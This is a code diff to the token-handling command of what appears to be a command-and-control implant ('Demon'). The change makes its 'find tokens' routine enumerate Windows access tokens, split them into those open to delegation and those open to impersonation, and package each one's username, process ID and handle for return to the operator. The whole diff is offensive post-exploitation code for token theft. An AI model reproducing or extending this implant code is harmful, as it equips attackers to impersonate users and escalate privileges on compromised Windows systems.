@@ -1524,9 +1524,12 @@ VOID CommandToken( PPARSER Parser )
 
         case DEMON_COMMAND_TOKEN_FIND_TOKENS: PUTS( "Token::ListTokens" )
         {
-            PSavedToken TokenList = NULL;
-            DWORD NumTokens = 0;
-            BOOL Success = FALSE;
+            PUniqueUserToken TokenList    = NULL;
+            DWORD            NumTokens    = 0;
+            BOOL             Success      = FALSE;
+            DWORD            NumDelTokens = 0;
+            DWORD            NumImpTokens = 0;
+            DWORD            i            = 0 ;
 
             Success = ListTokens( &TokenList, &NumTokens );
 
@@ -1534,16 +1537,44 @@ VOID CommandToken( PPARSER Parser )
 
             if ( Success )
             {
-                for (DWORD i = 0; i < NumTokens; ++i)
+                // TODO: this can surely be more efficient
+
+                for (i = 0; i < NumTokens; ++i)
                 {
-                    PackageAddInt32( Package, TokenList[ i ].token );
-                    PackageAddBytes( Package, TokenList[ i ].username, StringLengthA( TokenList[ i ].username ) );
+                    if ( TokenList[ i ].delegation_available )
+                        NumDelTokens++;
+                    if ( TokenList[ i ].impersonation_available )
+                        NumImpTokens++;
+                }
+
+                PackageAddInt32( Package, NumDelTokens );
+
+                for (i = 0; i < NumTokens; ++i)
+                {
+                    if (TokenList[ i ].delegation_available)
+                    {
+                        PackageAddBytes( Package, TokenList[ i ].username, StringLengthA( TokenList[ i ].username ) );
+                        PackageAddInt32( Package, TokenList[ i ].dwProcessID );
+                        PackageAddInt32( Package, TokenList[ i ].localHandle );
+                    }
+                }
+
+                PackageAddInt32( Package, NumImpTokens );
+
+                for (i = 0; i < NumTokens; ++i)
+                {
+                    if (TokenList[ i ].impersonation_available)
+                    {
+                        PackageAddBytes( Package, TokenList[ i ].username, StringLengthA( TokenList[ i ].username ) );
+                        PackageAddInt32( Package, TokenList[ i ].dwProcessID );
+                        PackageAddInt32( Package, TokenList[ i ].localHandle );
+                    }
                 }
             }
 
             if ( TokenList )
             {
-                DATA_FREE( TokenList, NumTokens * sizeof( SavedToken ) );
+                DATA_FREE( TokenList, NumTokens * sizeof( UniqueUserToken ) );
             }
 
             break;
